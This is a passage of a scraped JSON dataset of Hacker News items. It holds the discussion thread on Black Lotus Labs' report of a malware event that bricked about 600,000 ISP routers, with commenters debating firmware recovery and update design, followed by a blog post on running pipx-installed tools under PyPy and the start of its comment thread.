implied. Use of this information is at the end userâ€™s own risk. Post Views: 30,498 No related posts. Black Lotus Labs Author Black Lotus Labs The mission of Black Lotus Labs is to leverage our network visibility to help protect customers and keep the internet clean. Trending Now Eight Arms to Hold You: The Cuttlefish Malware Black Lotus Labs May 1, 2024 The Pumpkin Eclipse Black Lotus Labs May 30, 2024 You may also like Eight Arms To Hold You: The Cuttlefish Malware May 1, 2024 The Darkside Of TheMoon March 26, 2024 KV-Botnet: Donâ€™t Call It A Comeback February 7, 2024 Categories Adaptive Networking Connected Security Hybrid Cloud Communications and Collaboration Edge Computing SASE Lumen is guided by our belief that humanity is at its best when technology advances the way we live and work. With 450,000 route fiber miles serving customers in more than 60 countries, we deliver the fastest, most secure platform for applications and data to help businesses, government and communities deliver amazing experiences. Services not available everywhere. Â©2022 Lumen Technologies. All Rights Reserved. Press enter/return to begin your search",
    "commentLink": "https://news.ycombinator.com/item?id=40525130",
    "commentBody": "The Pumpkin Eclipse (lumen.com)218 points by alexrustic 3 hours agohidepastfavorite103 comments Scoundreller 2 hours ago> These reports led us to believe the problem was likely a firmware issue, as most other issues could be resolved through a factory reset. My dream is to intercept the write-enable lines on the flash chips holding these firmwares so I can lock out updates. And schedule a daily reboot for any memory-resident-only crap. Thatâ€™s what we used to do on, ahem, satellite receivers, 20 years ago and maybe we all need to treat every device attached to the internet as having a similar susceptibility to â€œelectronic counter-measuresâ€. Or at least monitor them for updates and light up a light when an update happens if it was my own equipment and Iâ€™d know if it should go off or not. reply not2b 1 hour agoparentIt's a no-win situation. Sure, disabling firmware updates would have prevented this attack, but it would also prevent security fixes that keep the routers from being turned into a botnet. But what I don't get in this case is why it was not possible to reset the device to its original state. It seems like a misdesign if it's possible to destroy all of the firmware, including the backup. reply kbenson 1 hour agorootparentYou could but a base level firmware on ROM, with a hardware trigger, and all that does on boot is listen and receive a signed firmware to write to the system. It needs a way to be triggered through hardware examining traffic and that also needs to require the seen command be signed. That recovery boot system needs to be as simple and minimal as possibly so you can have good assurance that there aren't problems with it, and should be written in the safest language you can get away with. Guard that signing key with your life, and lock it away for a rainy day, only to be used if much of your fleet of devices is hosed entirely. It should not be the same as a firmware signing key which needs to be pulled out and used sometimes. I think that could work, to a degree. There's always the risk that your recovery mechanism itself it exploited, so you need to make it as small and hardened a target as possible and reduce its complexity to the bare minimum. That doesn't solve the problem, which might be inherently unsolvable, but it may reduce that likelihood of it to levels where it's not a problem until long past the lifecycle of the devices. reply ajross 1 hour agorootparent> You could but a base level firmware on ROM, with a hardware trigger, and all that does on boot is listen and receive a signed firmware to write to the system. Almost all devices have something like that already in the form of a bootloader or SOC bootstrapping mode. But the idea breaks down if you want to do it OTA. The full storage/kernel/network/UI stack required to make that happen isn't ever going to run under \"ROM\" in the sense of truly immutable storage. The best you get is a read-only backup partition (shipped in some form on pretty much all laptops today), but that's no less exploitable really. reply kbenson 2 minutes agorootparent> The full storage/kernel/network/UI stack required to make that happen isn't ever going to run under \"ROM\" in the sense of truly immutable storage. Why not? I'm essentially describing a specialized OOB system, and it would just use a carved out small chunk of system RAM or ship with a minimal amount RAM of its own. If you mean actually impossible to change because it's physical ROM (\"truly immutable\"), that's less important to the design than there's no mechanism that allows that storage area to be written to from the system itself, whether that's just the very locked down and minimal recovery kernel it houses not allowing it, or a jumper. stacktrust 57 minutes agorootparentprevApple has a robust recovery mechanism on their laptops, via T2 security coprocessor. https://www.macrumors.com/2020/06/25/apple-silicon-macs-new-... https://support.apple.com/guide/security/ reply ajross 20 minutes agorootparentWhich is still running out of mutable storage. The point isn't whether you can verify the boot, it's whether you can prevent a compromised device (compromised to the point of being able to write to its own storage) from bricking itself. Now, as it happens Apple (everyone really, but Apple is a leader for sure) has some great protections in place to prevent that. And that's great. But if you feel you can rely on those protections there's no need to demand the ROM recovery demanded upthread. reply stacktrust 5 minutes agorootparentThere's also Apple DFU mode to restore OS with help from immutable ROM and external device, without depending on installed OS or mutable \"Recovery OS\" partition, https://theapplewiki.com/wiki/DFU_Mode & https://support.apple.com/en-us/108900 > DFU or Device Firmware Upgrade mode allows all devices to be restored from any state. It is essentially a mode where the BootROM can accept iBSS. DFU is part of the SecureROM which is burned into the hardware, so it cannot be removed. bippihippi1 1 hour agorootparentprevthe bootloader installs the firmware. if you corrupt the bootloader, it can't install anything anymore. you'd need to physically access the chip to use an external flashing device. Some devices have non-writable bootloaders. They have an internal fuse that blows after the first write, so the chip's bootloader is locked. That means you can always flash a new firmware, but you can't fix any bugs in the bootloader. reply Scoundreller 35 minutes agorootparentOr a JTAG interface that the chip has in silicon and recovery is always possible from bare-metal. Dunno if thatâ€™s technically in the MCUâ€™s bootloader or if the boot loader comes after. Still requires a truck roll but at least you donâ€™t need a hot air workstation. reply tonyarkles 30 minutes agorootparent> Or a JTAG interface that the chip has in silicon and recovery is always possible from bare-metal. Dunno if thatâ€™s technically in the MCUâ€™s bootloader or if the boot loader comes after. If the vendor's actually trying to lock down the platform they'll usually burn the JTAG fuses as well. It's hit or miss though, I've definitely come across heavily locked down devices that still have JTAG/SWD enabled. Edit: To your question, JTAG is usually physical silicon, not part of the bootloader. reply dataflow 1 hour agorootparentprev> the bootloader installs the firmware. if you corrupt the bootloader, it can't install anything anymore. That seems like awful design? Can't you have an alternate immutable bootloader that can only be enable with a physical switch? Or via some alternate port or something? That way they can update the live one while still having a fallback/downgrade path in case it has issues. reply incangold 1 hour agorootparentprev25 years in tech and Iâ€™m still waiting for that free lunch reply sounds 1 hour agorootparentprevIt's an interesting challenge because the device is nominally \"under ISP control\" but any device located in a customer's home is under the physical control of the customer. The mistrust between the ISP and the customer leads to \"trusted\" devices where the firmware, including the backup, can be overwritten by the ISP, but then cannot recover if it gets corrupted. And believe me, the corrupt firmware scenario happens a lot due to incompetence. This is getting attention because it wasn't incompetence this time. But how does blank, unprovisioned equipment discover a path to its provisioning server? Especially in light of the new \"trusted\" push, this is an arms race in a market segment such as routers where there isn't any money for high end solutions - only the cheapest option is even considered. tl;dr: a social and economic problem, likely can't be fixed with a purely technical solution reply sidewndr46 1 hour agorootparentThis was years ago, but I remember getting cable service activated somewhere in Florida with Bright House. I handed the cable guy some ancient motorola cable modem I had found at a discount store. The guy took one look at it and said \"look dude, if you hacked this thing to get around bandwidth caps it is your problem if you get caught\". I guess apparently that particular modem was pretty easy to modify reply cuu508 1 hour agorootparentprevTechnical solution: customer treats ISP's modem/router as untrusted, and daisy chains their own router after it. Neither malware nor ISP's shenanigans can access the inner network. reply Scoundreller 34 minutes agorootparentThatâ€™s what I do. Also makes changing providers straightforward (though last time I needed to set up some custom VLAN stuff on my router but didnâ€™t have to fumble with any wifi config). reply yjftsjthsd-h 1 hour agorootparentprev> It seems like a misdesign if it's possible to destroy all of the firmware, including the backup. Humor me; how would that work? If anything, I'd expect it to be easier to overwrite the inactive slot (assuming an A/B setup, ideally with read-only root). If you really wanted, you could have a separate chip that was read-only enforced by hardware, and I've seen that done for really low level firmware (ex. Chromebook boot firmware) but it's usually really limited precisely because the inability to update it means you get stuck with any bugs so it's usually only used to boot to the real (rw) storage. reply stacktrust 1 hour agoparentprev> My dream is to intercept the write-enable lines on the flash chips holding these firmwares so I can lock out updates. And schedule a daily reboot for any memory-resident-only crap. There was an open hardware project for SD card emulation, where the emulator could reject writes, https://github.com/racklet/meeting-notes/blob/main/community... OSS emulation for SPI flash, https://trmm.net/Spispy/ Some USB drives (Kanguru) and SSD enclosures (ElecGear M.2 2230 NVME) have firmware and physical switch to block writes, useful to boot custom \"live ISOs\" that run from RAM. reply Scoundreller 1 hour agorootparentEventually in the satellite world, card emulators took over and only the receiver was a vector of attack, but then the receivers started getting simulated too. The nice thing about emulators is that you could intercept calls that you wanted and send your own response while still taking any and all updates. Hard to break when you have more control than they do. reply luma 2 hours agoparentprevI'm not too familiar with customer DSL solutions but for cable modems, that firmware and configuration is managed by the CMTS because technology and configuration changes on the head end may require customer-side changes to ensure continued operation. The config is a pretty dynamic thing as frequency plans, signal rate, etc change over time as the cable plant and head end equipment is upgraded and maintained. I'd expect that any attempt to lock write enable to the EEPROM would eventually result in your modem failing to provision. reply Scoundreller 1 hour agorootparentWhen your provider cuts you off, thatâ€™s when you know that your provider has a legit upgrade you need to take. Take the update and then lock stuff up again. Of course, I donâ€™t think youâ€™re supposed to make mods to your vendor provided equipmentâ€¦ In the satellite world, this would happen too: old firmware would be cut off. Thatâ€™s when you go legit for a while with your subâ€™d card, take the update, and watch your subâ€™d channels until the new update could be reverse engineered. And probably have some heroes learn the hard way of taking the update and having some negative impacts that are harder to reverse. reply luma 19 minutes agorootparentI'm not sure what such an approach would accomplish. If the goal is to prevent the kind of problem seen in the OP (which, let's be real - is a rare occurrence) in order to avoid an unplanned outage, you've instead created a situation where it'll fail to connect far more regularly as you're kicked off the network for not correctly handling the provisioning process. You're trading a rare unplanned outage for a common unplanned outage. reply schmidtleonard 2 hours agoparentprev> maybe we all need to treat every device attached to the internet as having a similar susceptibility to â€œelectronic counter-measuresâ€ \"First party malware\" reply aidenn0 2 hours agoparentprevI suppose from the point of view of someone with a black-market HU card, DirecTV was an example of an Advanced Persistent Threat. Never thought of it that way before. reply Scoundreller 2 hours agorootparentFunny thing about directv is that because they allowed for many manufacturers to build receivers, directv had little control over the receiver firmware, so these counter-counter measures werenâ€™t necessary at the receiver level. Other providers that rolled out their own receivers had high control over the receiver firmware and once users figured out how to protect their cards, the receivers became an effective attack vector for the lazy. But thatâ€™s where a lot of the public knowledge about JTAGs really started coming to light. Awfully nice of them to put in a cutout at the bottom of the receiver. reply russdill 1 hour agoparentprevSecure boot schemes can already \"fix\" this. If a boot image is programmed that isn't signed, the system boots to a write protected backup image. The system can also to some degree block the programming images that aren't signed, but presumably malware has gained root access. reply ck2 58 minutes agoparentprevISPs can send any firmware to a docsis cablemodem, without the user knowing or accepting. Imagine the damage that could be done by a malicious actor via the ISPs computers. Or imagine someone being able to hack the system that does that update even without the ISP. 600K users would be a toy, they could do it to 6 Million. Doesn't even have to be clever, just brick millions of cablemodems. North Korea or some other government level entity could manage the resources to figure that out. reply stacktrust 47 minutes agorootparentDo ISPs and modem vendors roll their own OTA infrastructure and signing key management, or contract it out? reply iknowstuff 2 hours agoparentprevHave you never interacted with a person whoâ€™s not a programmer in your entire life? How could you possibly think this is a good idea reply Denvercoder9 2 hours agorootparentMost non-programmers don't give a shit about their router beyond \"the wifi must work\". Something completely stateless that can't be broken or messed with actually sounds like something they'd want. reply starttoaster 2 hours agorootparentWhat about when the router has a security update that is actually useful to stop people from getting owned? Such as to address: https://thehackernews.com/2023/07/critical-mikrotik-routeros... Blocking updates seems useful for blocking malicious and helpful updates. I wonder which camp the majority of updates fall into. reply labcomputer 2 hours agorootparentWell, considering that most home users never update their router's firmware, I'm going to go out on a limb and suggest that the majority of applied updates are malicious. If you did want to go this route, a simple fix would be to have the write enable line gated by a hardware one-shot timer (think like a 555 timer) triggered by a physical button on the front (and the button would also reboot the router). The firmware update sequence would go like: Router prompts user to update using button -> user presses update button -> router reboots to clear malicious software -> when the router comes back up, the write enable gate remains open for $n minutes (and maybe there's a GPIO that can hold the gate open if it is already open) -> router performs software update. The problem is that there's pretty much no way to do this without adding a $1-2 to the BOM, and no manufacturer of (pro|con)sumer routers will do that. Edit: Or do what stacktrust wrote and just have a toggle switch (update/secure). reply starttoaster 2 hours agorootparent> Well, considering that most home users never update their router's firmware, I'm going to go out on a limb and suggest that the majority of applied updates are malicious. Consumer grade routers often have automatic updates these days. reply Scoundreller 1 hour agorootparentTo fix security issues, or to introduce new features increasing the attack surface? reply stacktrust 1 hour agorootparentOPNsense automatic updates are relatively conservative. reply internetter 1 hour agorootparentprevYeah I have a pretty nice router and inexplicably, random nights, it drops out at 3am for ~3 minutes and then comes back on (and has all the markings of a reboot in terms of the pattern of request failures). I have to assume Synology just decided that nothing's using the internet at 3am reply stacktrust 2 hours agorootparentprevA physical switch can be locally toggled by the device owner/admin. Some motherboards offer a physical jumper for firmware updates, including x86 PC Engines APU2 coreboot router. reply starttoaster 2 hours agorootparentSo here's another problem. Going back to the point made earlier in this thread \"users don't care much about their routers.\" The average user opens their router page exceedingly rarely, which is the benefit of automatic updates. I set up my mom's router, and she works in IT (more in project management these days, so she's fallen into being a mostly non-technical user.) And she still texts me every time she needs to get into it to ask me what the password I set up was... once every few years. The downfall of automatic updates is obviously something like the case of the article this discussion is about. But weigh up the costs and benefits, in my opinion, the scale tips more towards automatic updates when you factor in all the critical level vulnerabilities that router OS's have accrued over the years. reply stacktrust 1 hour agorootparentSome consumer routers (e.g. Amazon eero) have moved to cloud/app config and automatic updates. A read-only partition can bootstrap recovery from cloud, if the main firmware or config is damaged. Some updates are possible with live kernel patching of the memory-resident OS, which can also be used by malware. reply hifromwork 1 hour agorootparentprevWormable vulnerability in a router is 10x bigger issue in practice than attacks that brick a router. By \"in practice\" I mean judging by the real world attacks that I know of. Hacked routers are used as residential proxies for criminals, for DDoS attacks, fast flux networks, credential stuffing attacks, and more. Bricking routers is rare (and very loud), that's why it's news on HN. Many router malware families don't even try to be persistent. Even Mirai - arguably the most famous router botnet - is not persistent [1]. In case the device is rebooted, it just gets infected again in a few minutes. It's very important that all network connected devices have an update mechanism, working automatically in the background. [1] At least the original version. After the code leak people were doing all kinds of updates, so there are some variants that try to be persistent in some cases. reply stacktrust 34 minutes agorootparent> In case the device is rebooted, it just gets infected again in a few minutes. Can Suricata detect and block known router botnets? reply fiedzia 2 hours agorootparentprevFor \"wifi to work\" you will need updates. Though updating all devices at once is a really dumb policy. reply dymk 2 hours agorootparentprevBummer then, SSIDs and WiFi passwords are state. reply WhyNotHugo 2 hours agorootparentTo be fair, most people never change these. In any case, you can have a separate storage (you need less than 1KB) for these two things. reply Scoundreller 1 hour agorootparentI think thatâ€™s usually the case: that will be stored in a small 24c or 93c (i2c or SPI) chip that is separate from the firmware that may only handle 1000 flashes and takes a lot longer to flash (often requiring risky and long downtime). reply q0uaur 2 hours agorootparentprevplenty of routers in my country (id go on a limb and say the majority) have both written on a sticker, different password for each device generated when the firmware first gets installed, and people NEVER change it. edit they also come with a QR code you can scan on your phone to connect to the wifi without manually copy the password, so people just put up that qr code somewhere and connecting is easy enough. reply ghshephard 2 hours agorootparentprevI have a friend who used to do classified military work - and a lot of the firmware on munitions is designed in precisely this way to avoid countermeasures. Advanced systems have a lot of software, and the systems they are shipped on have fuses and circuit traces that are melted to avoid any possible countermeasures or modification once they've passed acceptance. reply starttoaster 2 hours agorootparentWhen the military finds a flaw in their immutable firmware, what do they do with those munitions? Throw them away and build new ones? Routers are networked and critical vulnerabilities that should be addressed get patched on them over time. Is the proposal to just tell the user to buy a new router? reply ThrowawayTestr 2 hours agorootparent>what do they do with those munitions? They're sent back to the manufacturer and the boards are replaced. reply rvnx 2 hours agorootparentHere is the same with the routers that got bricked. They probably need to be reflashed. Most likely they are leased by the ISP so under their scope of responsibility and maintenance. \"internet doesn't work\" -> \"send me a new router, it broke\", problem solved. reply Cthulhu_ 1 hour agorootparentprevGiven what little I know of military stuff, swapping out a hardware board is cheap compared to the cost of the whole thing. Would they be sent back or would an engineer travel to wherever stuff is stored to do the job? reply whatevaa 2 hours agorootparentprevHe just wants to watch the world burn. reply bongodongobob 2 hours agorootparentprevSame type of person who blocks Windows updates, messes with their registry, removes system files and processes, and then complains when Windows gets flaky on them and breaks in strange and unpredictable ways. reply stacktrust 2 hours agorootparentWindows has a stateless mode. https://learn.microsoft.com/en-us/windows/iot/iot-enterprise... > Unified Write Filter (UWF) is an optional Windows 10 feature that helps to protect your drives by intercepting and redirecting any writes to the drive (app installations, settings changes, saved data) to a virtual overlay. The virtual overlay is a temporary location that is cleared during a reboot or when a guest user logs off.. Increases security and reliability where new apps aren't frequently added. Can be used to reduce wear on solid-state drives and other write-sensitive media. Optimizing Application load timing on boot â€“ it can be faster to resume from a HORM file on every boot rather than reloading the system on each boot. UWF replaces the Windows 7 Enhanced Write Filter (EWF) and the File Based Write Filter (FBWF). reply Cthulhu_ 1 hour agorootparentReminds me of some management software we ran on school computers some 20 odd years ago, it basically made the computer immutable and it'd be back to how it was after a reboot. I forgot what it was called and never knew how it worked though, at the time I was impressed. It needed an admin password to make changes that persisted. reply dotnet00 2 hours agorootparentprevThey wouldn't have to do that if Windows didn't insist on being forceful with updates even for power users, who can be trusted to decide when to update. Lately it's not as bad since you can delay/disable forced reboots for updates for ~2 months at a time, but still it'd be far more ideal to just be able to turn off forced reboots entirely. reply bongodongobob 1 hour agorootparentHi, I'm a power user too, and updates don't break anything, stop pretending it's 1998. Sincerely, every IT dept. reply a1369209993 8 minutes agorootparentHi, I'm a linux user, and we never have any techinical problems that would require updates in the first place. Sincerely, someone who is just as capable of lying as you apparently are. reply Scoundreller 2 hours agorootparentprevIf itâ€™s a switch, you could unlock it and allow for the providerâ€™s (or your own if itâ€™s your own equipment) updates before re-locking it. reply nisa 2 hours agoprevArticle is light on the interesting details. How did they came in? Do these routers have open ports and services by default and answer to the Internet in a meaningful way? Couldn't someone grab different firmware versions and compare them? Looks like they are doing what everyone else is doing and using OpenWrt with a vendor SDK: https://forum.openwrt.org/t/openwrt-support-for-actiontec-t3... What's interesting here is speculated the vendor send a malicious/broken update: https://www.reddit.com/r/Windstream/comments/17g9qdu/solid_r... So why is there no official statement from the ISP? If it was an attack shouldn't there be an investigation? I'm not familiar with how this is handled in the USA but this looks really strange. Maybe these machines were bot infested and the vendor pushed an update that broke everything? Maybe it's like in the article and it was a coordinated attack maybe involving ransom and everyone got told it's a faulty firmware update, keep calm? which is also kind of bad, as the customer I'd like to know if there security incidents. Has anyone links to firmware images for these devices? Or any more details? reply londons_explore 2 hours agoprev> Lumen identified over 330,000 unique IP addresses that communicated with one of 75 observed C2 nodes How does Black Lotus Labs global telemetry know which IP communicated with which other IP if they have control of neither endpoint? Who/what is keeping traffic logs? If these guys can do it, remind me again how Tor is secure because nobody could possibly be able to follow packets from your machine, through the onion hops, to the exit node where the same packet is available unencrypted... reply codexon 0 minutes agoparentLumen is a tier 1 network so a lot of traffic passes through them. They can man-in-the-middle the traffic and see the TCP packets going through their network. reply luma 2 hours agoparentprevPresumably, Windstream is logging customer traffic as a matter of course. It might just be metadata (NetFlow/sFlow/IPFIX/etc), but one way or the other the only way they have this information is if they are recording and retaining it. Hopefully this is made clear in Windstream's contract terms. reply londons_explore 2 hours agorootparentThese aren't likely 'top flows', since the C&C data will probably only be a few kilobytes. So to capture this, you at a minimum need to be logging every TCP connection's SRC IP and DST IP. And they seem pretty confident in their worldwide map and fairly exact counts, so I would guess they must have probes covering most of the world doing this monitoring, and it likely isn't just 1-in-a-million sampling either... reply luma 22 minutes agorootparentFor whatever it's worth, what you describe above is specifically what IPFIX/NetFlow etc does. Not full-take, just metadata for each flow such as the time, src/dst ip/port, tcp sequence #, octets sent, etc. This is common in datacenters for traffic and flow analysis for troubleshooting, capacity planning, and the occasional incident response. More details: https://en.wikipedia.org/wiki/IP_Flow_Information_Export reply vieinfernale 1 hour agoparentprevI'm quite disenchanted here. So this means that it is practically impossible to avoid IP fingerprints in any way ? Even with Tor, VMs, etc ? You'll always be at the mercy of whoever runs the show unless you own the physical servers reply hedora 2 hours agoparentprevThis is reasonably standard functionality for backbone routers. They have to parse the TCP headers in hardware anyway, and can track common endpoints with O(1) state. Of course, on the other end of the spectrum, the NSA has tapped into core internet links, is recording everything it possibly can, and is keeping it forever. reply sebzim4500 1 hour agorootparentIs that actually feasible with their budget? If we are generous and assume there a zettabyte of data a year that they want to store. At consumer prices, you would have to pay $10B per year just buying hard drives yet alone the operational costs/redundancy. The budget for all of the US intelligence services is ~$65B. I think if they wanted to actually do what you are describing it would be the single biggest intelligence expense they have and I don't see how you hide that. reply gary_0 17 minutes agorootparentAnd you don't need to go that far to establish an information dictatorship anyways. China does just fine on a relatively modest budget. Plus nowadays you can easily spin up an ML model to identify \"potentially incriminating\" data while throwing out \"probably just browsing cat pictures\". And rubber hoses are still cheap. reply Hikikomori 1 hour agorootparentprevYup. Pretty much all ISPs collect sflow/netflow from their devices to be able to debug problems or detect ddos. reply shrubble 2 hours agoparentprevLumen (merger of Level3 and CenturyLink) sells services to a large part of the Internet and may provide a lot of the backhaul for Windstream. In which case they would be in the path for monitoring. reply ronnier 2 hours agoprevFor a few years now I only buy a small x86 box with dual nics and run OpenWRT. I love it. It's open source, lots of support, good community. It supports wireguard. Latest version allows you to even run docker containers. reply hedora 2 hours agoparentIâ€™ve got an old PC Engines board with openbsd on it. Itâ€™s been remarkably trouble free for something like 8 years. reply ziml77 1 hour agorootparentThe PC Engines boards are great for that. I've got mine running OPNSense (FreeBSD) and it's not required any fuss. reply fckgw 2 hours agoparentprevSince it were modems that were affected, OpenWRT would do nothing to protect you. reply nisa 2 hours agorootparentOpenWrt works for some modems pretty fine. It's not straight forward as the VDSL firmware can't often be distributed but poeple use it on avm Fritzbox devices. Also LTE devices are supported. Not sure about cable modems, probably not. It's probably involved and not straight forward so for most users, even technical ones it's no alternative. reply ronnier 2 hours agorootparentprevAh, that's what I get for not reading the article. reply jeffbee 2 hours agoparentprevThese are DSL modems, though. At some point there has to be some interface between the WAN side, be it DSL or coax or fiber, and your network. Even DSL adapters for PCIe slots are just systems on a stick, coming with all the features and bugs of a \"router\" but without the enclosure. reply ronnier 2 hours agorootparentYou can tell I didn't read the article :) reply Kiboneu 57 minutes agoprevWell if you backdoor 600k routers and introduce a firmware bug with one of your patches, this is what happens. Can't they just stage their updates? Surely, malware authors and users must be too cool for adopting standard prod practices. reply its-summertime 43 minutes agoprevIs the >2x increase in other devices addressed in any form? reply bostonpete 42 minutes agoprevWhat is the significance of the article/post title...? reply thamer 14 minutes agoparentThis attack happened a few days before Halloween 2023 (pumpkins), with a large drop in the number of devices connected to the Internet â€“ like how an eclipse suddenly brings a period of darkness, maybe? This is just my interpretation, I also found it cryptic. reply steelframe 1 hour agoprevFor my home network I've purchased a networking appliance form-factor computer, which is basically a regular old an i3 with VT-x support in a fanless case and 4 2.5GiB NICs. I've installed my favorite stable Linux distro that gets regular automated security updates in both host and a VM, and I've device-mapped 3 of the NICs into that VM. The remaining NIC remains unattached to anything unless I want to SSH in to the host. I'm running UFW and Shorewall in the VM to perform firewall and routing tasks. If I want to tweak anything I just SSH in to that VM. I have a snapshot of the VM disk in case I mess something up so I can trivially roll back to something that I know works. I've purchased a couple of cheaper commercial WiFi access points, and I've placed them in my house with channels set up to minimize interference. Prior to this I've gone through several iterations of network products from the likes of Apple, Google, and ASUS, and they all had issues with performance and reliability. For example infuriating random periods of 3-5 seconds of dropped packets in the middle of Zoom conferences and what not. Since I've rolled my own I've had zero issues, and I have a higher degree of confidence that it's configured securely and is getting relevant security updates. In short, my home network doesn't have a problem unless some significant chunk of the world that's running the same well-known stable Linux distro also has a problem. reply tmoertel 20 minutes agoparentOut of curiosity, which networking appliance form-factor computer did you purchase? reply xacky 2 hours agoprevReminds me of the CIH virus. It's only a matter of time for ransomware authors to start using firmware blanking as a new technique. reply pragma_x 1 hour agoprevFor anyone else that was confused by the headline, this is about the destruction of 600,000 individual (small) routers. Not routers that are worth $600,000 (each or combined). reply hcfman 2 hours agoprevWhich routers are affected ? reply prophesi 2 hours agoparentAnd which ISP? reply AzN1337c0d3r 2 hours agorootparentWindstream uses T3200 and T3260. reply prophesi 1 hour agorootparentAh, was able to find/validate that from a news outlet covering this. Thanks! https://arstechnica.com/security/2024/05/mystery-malware-des... reply aschla 2 hours agoparentprev\"We began an investigation after seeing repeated complaints mentioning specific ActionTec devices, as a massive number of device owners stated that they were not able to access the internet beginning on October 25, 2023. A growing number of users indicated the outage was common to two different gateway models: the ActionTec T3200s and ActionTec T3260s, both displaying a static red light.\" reply Scoundreller 2 hours agoparentprevâ€œthe ActionTec T3200s and ActionTec T3260s, both displaying a static red light.â€ â€œThis included a drop of ~480k devices associated with Sagemcom, likely the Sagemcom F5380 as both this model and the ActionTec modems were both modems issued by the ISP.â€ reply sgtaylor5 2 hours agoprevrelated article from Ars Technica: https://arstechnica.com/security/2024/05/mystery-malware-des... reply skilled 2 hours agoparentThat doesnâ€™t count as related as it is a rewrite of the original source. Just saying, it adds no details of its own. reply thecosas 2 hours agorootparentIt does include information which the original article specifically excluded from mentioning: the ISP involved. \"Windstream\" is mentioned in the first paragraph of the Ars article, while the Lumen post makes references to \"a rural ISP\" throughout the post. reply skilled 1 hour agorootparentSo say that instead of related and make people waste their time reading the same information. reply jeffbee 2 hours agoprev\"Router\" being used to mean customer premises equipment, it seems. reply TheJoeMan 2 hours agoparentHere I was hoping someone was â€œencouragingâ€ an ISP to upgrade their infra. reply localfirst 2 hours agoprev [â€“] this along with other recent security incidents suggest somebody is rehearsing for massive campaign tied to another geopolitical ambitions. reply Crosseye_Jack 1 hour agoparentI would say that the rehearsal has long been over. Just before Russian troops entered Ukraine Viasat saw an attack on it's network which among other countries serves Ukraine, which saw updates getting pushed to modems designed to disable those modems. https://en.wikipedia.org/wiki/Viasat_hack reply waihtis 1 hour agoparentprev [â€“] well there is a top cyber offensive power whom is de facto at war with the west, hardly surprising reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Lumen Technologies' Black Lotus Labs reported a cyberattack from October 25-27, 2023, that disabled over 600,000 SOHO (Small Office/Home Office) routers within a single ISP's network, requiring hardware replacements.",
      "The attack, attributed to the Chalubo RAT (Remote Access Trojan) malware, exploited weak credentials or exposed interfaces, causing significant service disruptions, particularly in rural areas.",
      "Black Lotus Labs advises securing routers with strong passwords and regular updates; further details and Indicators of Compromise (IoCs) are available on their GitHub page."
    ],
    "commentSummary": [
      "Discussions focus on managing firmware updates and storage for internet-connected devices, balancing security patches with preventing unwanted updates.",
      "Key issues include the use of immutable storage for system recovery, complexities of ISP-controlled devices, and the importance of secure boot schemes.",
      "Specific incidents, like the backdooring of 600,000 routers and Windstream's widespread outages, underscore the need for reliable update mechanisms and robust security practices."
    ],
    "points": 218,
    "commentCount": 102,
    "retryCount": 0,
    "time": 1717084349
  },
  {
    "id": 40522241,
    "title": "PyPy Proves Reliable and Efficient for Python Programs on Ubuntu Servers",
    "originLink": "https://utcc.utoronto.ca/~cks/space/blog/python/PyPyQuietlyWorking",
    "originBody": "Chris Siebenmann :: CSpace Â» blog Â» python Â» PyPyQuietlyWorking Welcome, guest. PyPy has been quietly working for me for several years now May 29, 2024 A number of years ago I switched to installing various Python programs through pipx so that each of them got their own automatically managed virtual environment, rather than me having to wrestle with various issues from alternate approaches. On our Ubuntu servers, it wound up being simpler to do this using my own version of PyPy instead of Ubuntu's CPython, for various reasons. I've been operating this way for long enough that I didn't really remember how long. Recently we got our first cloud server, and I wound up installing our cloud provider's basic CLI tool. This CLI tool has a number of official ways of installing it, but when the dust settles I discovered it was a Python package (with a bunch of additional complicated dependencies) and this package is available on PyPi. So I decided to see if 'pipx install ' would work, which it did. Only much later did it occur to me that this very large Python and stuff tool was running happily under PyPy, because this is the default if I just 'pipx install' something. As it turns out, everything I have installed through pipx on our servers is currently installed using PyPy instead of CPython, and all of it works fine. I've been running all sorts of code with PyPy for years without noticing anything different. There is definitely code that will notice (I used to have some), but either I haven't encountered any of it yet or significant packages are now routinely tested under PyPy and hardened against things like deferred garbage collection of open files. (Some current Python idioms, such as the 'with' statement, avoid this sort of problem, because they explicitly close files and otherwise release resources as you're done with them.) In a way there's nothing remarkable about this. PyPy's goal is to be a replacement for CPython that simply works while generally being faster. In another way, it's nice to see that PyPy has been basically completely successful in this for me, to the extent that I can forget that my pipx-installed things are all running under PyPy and that a big cloud vendor thing just worked. Written on 29 May 2024. Â« ZFS's transactional guarantees from a user perspective These are my WanderingThoughts (About the blog) Full index of entries Recent comments This is part of CSpace, and is written by ChrisSiebenmann. Mastodon: @cks Twitter @thatcks * * * Categories: links, linux, programming, python, snark, solaris, spam, sysadmin, tech, unix, web Also: (Sub)topics This is a DWiki. GettingAround (Help) Search: Page tools: View Source, Add Comment. Search: Login: Password: Atom Syndication: Recent Comments. Last modified: Wed May 29 22:48:31 2024 This dinky wiki is brought to you by the Insane Hackers Guild, Python sub-branch.",
    "commentLink": "https://news.ycombinator.com/item?id=40522241",
    "commentBody": "PyPy has been working for me for several years now (utcc.utoronto.ca)180 points by throw0101c 8 hours agohidepastfavorite89 comments sixhobbits 7 hours agoI've been using Python since like 2011 and I still read PyPy and think PyPI. Naming things is hard but it would be nice if people tried a bit harder to avoid clashes at least within the same ecosystem. reply rsynnott 6 hours agoparentI'm not sure which came first, but whichever came second is the worst naming of anything ever. reply scbrg 6 hours agorootparentPyPy was first. It was indeed easier in the era when the Cheese Shop was called the Cheese Shop, and not PyPi. [edit]: After some searching, I notice that PEP 301 is actually dated Oct 2002, so perhaps I'm wrong. The public/advertised name was Cheese Shop for quite some time after that, but apparently the name PyPi was at least suggested much earlier than I thought. https://peps.python.org/pep-0301/ reply leetrout 6 hours agorootparentFor others that do not know: This is why python has wheels. reply bxparks 4 hours agorootparentCan someone explain what a \"wheel\" has anything to do with \"cheese\"? Every time I come across the term \"wheel\" in Python, it makes no sense to me. I believe it has something to do with Monty Python. I think I have watched the skit that involves the cheese, but it's beyond my understanding how it's related to wheel. Maybe I watched the wrong skit. Maybe it's because I don't understand Monty Python. reply avianlyric 4 hours agorootparentCheese is traditionally made I large round blocks called â€œwheelsâ€. I.E. A wheel of cheese. So wheel is to cheese, as loaf is to bread. https://www.chucklingcheese.co.uk/news/cheese-gift-guides/wh... reply ddulaney 4 hours agorootparentprevItâ€™s not a Monty Python thing. Some cheese is made in a wheel shape as part of the manufacturing process. If you buy some kinds of bulk cheese, you will get it in wheels. https://dibruno.com/whole-wheel-parmigiano-reggiano/ reply Tempest1981 4 hours agorootparentSome think it is. Excerpt from this talk by 